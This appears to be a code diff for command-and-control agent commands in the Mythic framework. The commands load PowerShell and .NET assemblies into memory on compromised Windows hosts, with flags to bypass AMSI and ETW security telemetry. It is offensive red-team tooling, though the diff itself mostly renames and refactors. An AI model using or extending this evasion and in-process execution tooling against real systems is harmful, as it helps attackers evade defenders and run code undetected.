@@ -52,7 +52,6 @@ class PwPickCommand(CommandBase):
     )
 
     async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
-        
         script  = task.args.get_arg("script") or ""
         command = task.args.get_arg("command")
 
@@ -63,6 +62,13 @@ class PwPickCommand(CommandBase):
         task.args.remove_arg("script")
         task.args.remove_arg("command")
         
+        logging.info(f"Callback UUID: {task.Callback.AgentCallbackID}")
+
+        AgentData = await StorageExtract( task.Callback.AgentCallbackID )
+
+        bypass_dotnet = AgentData["evasion"]["bypass_dotnet"]
+        patchexit     = AgentData["evasion"]["dotnet_bypass_exit"]
+
         AgentData = await StorageExtract( task.Callback.AgentCallbackID )
 
         bypass_dotnet = AgentData["evasion"]["bypass_dotnet"]
@@ -72,9 +78,9 @@ class PwPickCommand(CommandBase):
 
         if bypass_dotnet == "AMSI":
             bypass_flags = 0x700
-        elif bypass_flags == "ETW":  
+        elif bypass_dotnet == "ETW":  
             bypass_flags = 0x400     
-        elif bypass_flags == "AMSI and ETW":  
+        elif bypass_dotnet == "AMSI and ETW":  
             bypass_flags = 0x100
 
         if bypass_dotnet != "None":
@@ -82,36 +88,58 @@ class PwPickCommand(CommandBase):
         else:
             DisplayMsg += f"[+] Hardware Breakpoint bypass disabled\n"
 
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=task.Task.ID,
-            Response=DisplayMsg
-        ))
+        if bool( patchexit ) is True:
+            DisplayMsg += f"[+] Patch exit Enabled\n"
+        else:
+            DisplayMsg += f"[+] Patch exit Disabled\n"
 
-        content: bytes = await get_content_by_name("kh_dotnet_inline.x64.o", task.Task.ID)
+        await write_console( task.Task.ID, DisplayMsg )
+
+        args   = task.args.get_arg('args')
+        vers   = task.args.get_arg('version')
+        appdm  = task.args.get_arg('appdomain')
+        method = task.args.get_arg('method')
+
+        if method == "inline": 
+            method = 0
+        else: 
+            method = 1
+
+        task.args.remove_arg("args")
+        task.args.remove_arg("version")
+        task.args.remove_arg("keep")
+        task.args.remove_arg("appdomain")
+
+        content: bytes = await get_content_by_name("dotnet_assembly.x64.bin", task.Task.ID)
         if not content:
-            raise Exception("File BOF 'kh_dotnet_inline.x64.o' not found!")
-        
-        pwpick:bytes  = await get_content_by_name("kh_pwsh.x64.exe", task.Task.ID)
-        appdomain:str = ''.join(random.choice(string.ascii_letters) for _ in range(8))
-        args:str      = f"{command} {script}"
+            raise Exception("File BOF 'dotnet_assembly.x64.bin' not found!")
 
-        bof_args = [
-            {"type": "bytes", "value": pwpick.hex()},  # Assembly .NET
-            {"type": "char" , "value": args},          # Argumentos
-            {"type": "char" , "value": appdomain},     # AppDomain
-            {"type": "char" , "value": "v0.0.00000"},  # Versão do .NET
-            {"type": "int32", "value": bypass_flags},  # Flags de bypass (AMSI/ETW)
-            {"type": "int32", "value": 0},             # PatchExit (0 ou 1)
-            {"type": "int32", "value": 0},             # Campo reservado
+        pwpick_content: bytes = await get_content_by_name("kw_pwsh.x64.exe", task.Task.ID)
+        args:str = f"{command} {script}"
+
+        method = 0
+
+        sc_args = [
+            {"type": "int32", "value": method},
+            {"type": "bytes", "value": pwpick_content.hex()},  
+            {"type": "char" , "value": args},                        
+            {"type": "char" , "value": appdm},                       
+            {"type": "char" , "value": vers},                        
+            {"type": "int32", "value": 0},           # keep load
+            {"type": "int32", "value": bypass_flags},                
+            {"type": "int32", "value": patchexit},                   
+            {"type": "int32", "value": 0},           # spoof                 
         ]
 
-        task.args.add_arg("bof_file", content.hex())
-        task.args.add_arg("bof_id", 0, ParameterType.Number)
-        task.args.add_arg("bof_args", json.dumps(bof_args))
+        task.args.add_arg("method", method, ParameterType.Number)    # reserved value
+        task.args.add_arg("sc_file", content.hex())
+        task.args.add_arg("sc_args", json.dumps(sc_args))
+        task.args.add_arg("reserved_2", 0, ParameterType.Number)    # reserved value
+        task.args.add_arg("reserved_3", 0, ParameterType.Number)    # reserved value
 
         return PTTaskCreateTaskingMessageResponse(
             TaskID=task.Task.ID,
-            CommandName="exec-bof",  
+            CommandName="post_ex",
             TokenID=task.Task.TokenID,
             DisplayParams=display_params
         )
@@ -127,59 +155,6 @@ class DotnetVerArguments( TaskArguments ):
     async def parse_arguments(self):
         pass
 
-class DotnetVerCommand( CommandBase ):
-    cmd = "dotnet-verlist"
-    needs_admin = False
-    help_cmd = \
-    """
-    dotnet-verlist
-    """
-    description = "List available versions"
-    version = 2
-    author = "@ Oblivion"
-    attackmapping = ["T1055", "T1059", "T1027"]
-    argument_class = DotnetVerArguments
-    attributes = CommandAttributes(
-        supported_os=[SupportedOS.Windows],
-        builtin=True,
-    )
-
-    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
-        bof_args = []
-
-        content:bytes = await get_content_by_name( "kh_dotnet_listvers.x64.o", task.Task.ID )
-
-        display_params = ""
-        display_msg    = "[+] Listing the .NET versions availables\n"
-
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=task.Task.ID,
-            Response=display_msg
-        ))
-
-        task.args.add_arg("bof_file", content.hex())
-        task.args.add_arg("bof_id", 0, ParameterType.Number)
-        task.args.add_arg("bof_args", json.dumps(bof_args))
-
-        return PTTaskCreateTaskingMessageResponse(
-            TaskID=task.Task.ID,
-            CommandName="exec-bof",
-            TokenID=task.Task.TokenID,
-            DisplayParams=display_params
-        )
-
-    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
-        if not response:
-            return PTTaskProcessResponseMessageResponse(
-                TaskID=task.Task.ID,
-                Success=True
-            )
-
-        return PTTaskProcessResponseMessageResponse(
-            TaskID=task.Task.ID,
-            Success=True
-        )
-
 class DotnetInlineArguments( TaskArguments ):
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
@@ -194,13 +169,7 @@ class DotnetInlineArguments( TaskArguments ):
                     ParameterGroupInfo(
                         required=False,
                         group_name="Default",
-                        ui_position=1
                     ),
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="New File",
-                        ui_position=1
-                    )
                 ]
             ),
             CommandParameter(
@@ -212,13 +181,7 @@ class DotnetInlineArguments( TaskArguments ):
                     ParameterGroupInfo(
                         required=False,
                         group_name="Default",
-                        ui_position=2
                     ),
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="New File",
-                        ui_position=3
-                    )
                 ]
             ),
             CommandParameter(
@@ -230,33 +193,21 @@ class DotnetInlineArguments( TaskArguments ):
                     ParameterGroupInfo(
                         required=False,
                         group_name="Default",
-                        ui_position=3
                     ),
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="New File",
-                        ui_position=4
-                    )
                 ]
             ),
-            CommandParameter(
-                name="keep",
-                cli_name="keep",
-                type=ParameterType.Number,
-                description="Keep the AppDomain loaded after execution",
-                parameter_group_info=[
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="Default",
-                        ui_position=4
-                    ),
-                    ParameterGroupInfo(
-                        required=False,
-                        group_name="New File",
-                        ui_position=5
-                    )
-                ]
-            ),
+            # CommandParameter(  todo add keep
+            #     name="keep",
+            #     cli_name="keep",
+            #     type=ParameterType.Number,
+            #     description="Keep the AppDomain loaded after execution",
+            #     parameter_group_info=[
+            #         ParameterGroupInfo(
+            #             required=False,
+            #             group_name="Default",
+            #         ),
+            #     ]
+            # ),
             CommandParameter(
                 name="version",
                 cli_name="version",
@@ -266,13 +217,20 @@ class DotnetInlineArguments( TaskArguments ):
                     ParameterGroupInfo(
                         required=False,
                         group_name="Default",
-                        ui_position=5
                     ),
+                ]
+            ),
+            CommandParameter(
+                name="method",
+                type=ParameterType.ChooseOne,
+                description="using inline method (default: inline)",
+                choices=["inline"], # todo add fork
+                default_value="inline",
+                parameter_group_info=[
                     ParameterGroupInfo(
                         required=False,
-                        group_name="New File",
-                        ui_position=6
-                    )
+                        group_name="Default",
+                    ),
                 ]
             )
         ]
@@ -295,6 +253,9 @@ class DotnetInlineArguments( TaskArguments ):
             self.add_arg("appdomain", dictionary["appdomain"])
         else:
             self.add_arg("appdomain", ''.join(random.choice(string.ascii_letters) for _ in range(8)))
+
+        if "method" in dictionary:
+            self.add_arg("method", dictionary["method"])
 
         if "keep" in dictionary:
             self.add_arg("keep", 1)
@@ -340,7 +301,7 @@ class DotnetInlineArguments( TaskArguments ):
                     arg = argv[i]
                     if arg == "-file":
                         if i+1 >= len(argv):
-                            raise ValueError("Missing value for --file")
+                            raise ValueError("Missing value for -file")
                         args_dict["file"] = argv[i+1]
                         i += 2
                     elif arg == "-upload":
@@ -350,20 +311,22 @@ class DotnetInlineArguments( TaskArguments ):
                         i += 2
                     elif arg == "-args":
                         if i+1 >= len(argv):
-                            raise ValueError("Missing value for --args")
+                            raise ValueError("Missing value for -args")
                         args_dict["args"] = argv[i+1]
                         i += 2
                     elif arg == "-appdomain":
                         if i+1 >= len(argv):
-                            raise ValueError("Missing value for --appdomain")
+                            raise ValueError("Missing value for -appdomain")
                         args_dict["appdomain"] = argv[i+1]
                         i += 2
+                    elif arg == "-method":
+                        args_dict["method"] = argv[i+1]
                     elif arg == "-keep":
                         args_dict["keep"] = True
                         i += 1
                     elif arg == "-version":
                         if i+1 >= len(argv):
-                            raise ValueError("Missing value for --version")
+                            raise ValueError("Missing value for -version")
                         args_dict["version"] = argv[i+1]
                         i += 2
                     else:
@@ -402,7 +365,7 @@ class DotnetInlineArguments( TaskArguments ):
             return response
 
 class DotnetInlineCommand(CommandBase):
-    cmd = "dotnet-inline"
+    cmd = "dotnet-exec"
     needs_admin = False
     help_cmd = \
     """
@@ -481,9 +444,6 @@ class DotnetInlineCommand(CommandBase):
         display_params += f" -appdomain {task.args.get_arg('appdomain')}"
         
         task.args.remove_arg("file")
-
-        if task.args.get_arg("keep"):
-            display_params += " -keep"
         
         if task.args.get_arg('version') != "v0.0.00000":
             display_params += f" -version {task.args.get_arg('version')}"
@@ -501,9 +461,9 @@ class DotnetInlineCommand(CommandBase):
 
         if bypass_dotnet == "AMSI":
             bypass_flags = 0x700
-        elif bypass_flags == "ETW":  
+        elif bypass_dotnet == "ETW":  
             bypass_flags = 0x400     
-        elif bypass_flags == "AMSI and ETW":  
+        elif bypass_dotnet == "AMSI and ETW":  
             bypass_flags = 0x100
 
         if bypass_dotnet != "None":
@@ -516,43 +476,50 @@ class DotnetInlineCommand(CommandBase):
         else:
             DisplayMsg += f"[+] Patch exit Disabled\n"
 
-        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
-            TaskID=task.Task.ID,
-            Response=DisplayMsg
-        ))
+        await write_console( task.Task.ID, DisplayMsg )
 
-        args  = task.args.get_arg('args')
-        vers  = task.args.get_arg('version')
-        appdm = task.args.get_arg('appdomain')
+        args   = task.args.get_arg('args')
+        vers   = task.args.get_arg('version')
+        appdm  = task.args.get_arg('appdomain')
+        method = task.args.get_arg('method')
+
+        if method == "inline": 
+            method = 0
+        else: 
+            method = 1
 
         task.args.remove_arg("args")
         task.args.remove_arg("version")
         task.args.remove_arg("keep")
         task.args.remove_arg("appdomain")
 
-        content: bytes = await get_content_by_name("kh_dotnet_inline.x64.o", task.Task.ID)
+        content: bytes = await get_content_by_name("dotnet_assembly.x64.bin", task.Task.ID)
         if not content:
-            raise Exception("File BOF 'dotnet_inline.x64.o' not found!")
+            raise Exception("File BOF 'dotnet_assembly.x64.bin' not found!")
 
-        bof_args = [
-            {"type": "bytes", "value": file_contents.Content.hex()},  # Assembly .NET
-            {"type": "char" , "value": args},                        # Argumentos
-            {"type": "char" , "value": appdm},                       # AppDomain
-            {"type": "char" , "value": vers},                        # Versão do .NET
-            {"type": "int32", "value": bypass_flags},                 # Flags de bypass (AMSI/ETW)
-            {"type": "int32", "value": patchexit},                    # PatchExit (0 ou 1)
-            {"type": "int32", "value": 0},                            # Campo reservado
+        method = 0
+
+        sc_args = [
+            {"type": "int32", "value": method},
+            {"type": "bytes", "value": file_contents.Content.hex()},  
+            {"type": "char" , "value": args},                        
+            {"type": "char" , "value": appdm},                       
+            {"type": "char" , "value": vers},                        
+            {"type": "int32", "value": 0},           # keep load
+            {"type": "int32", "value": bypass_flags},                
+            {"type": "int32", "value": patchexit},                   
+            {"type": "int32", "value": 0},           # spoof                 
         ]
 
-        task.args.add_arg("bof_file", content.hex())
-        task.args.add_arg("bof_id", 0, ParameterType.Number)
-        task.args.add_arg("bof_args", json.dumps(bof_args))
-
-        logging.info(f"diplay params: {display_params}")
+        task.args.add_arg("method", method, ParameterType.Number)    # reserved value
+        task.args.add_arg("sc_file", content.hex())
+        task.args.add_arg("sc_args", json.dumps(sc_args))
+        task.args.add_arg("reserved_2", 0, ParameterType.Number)    # reserved value
+        task.args.add_arg("reserved_3", 0, ParameterType.Number)    # reserved value
 
         return PTTaskCreateTaskingMessageResponse(
             TaskID=task.Task.ID,
-            CommandName="exec-bof",  
+            CommandName="post_ex",
             TokenID=task.Task.TokenID,
             DisplayParams=display_params
         )
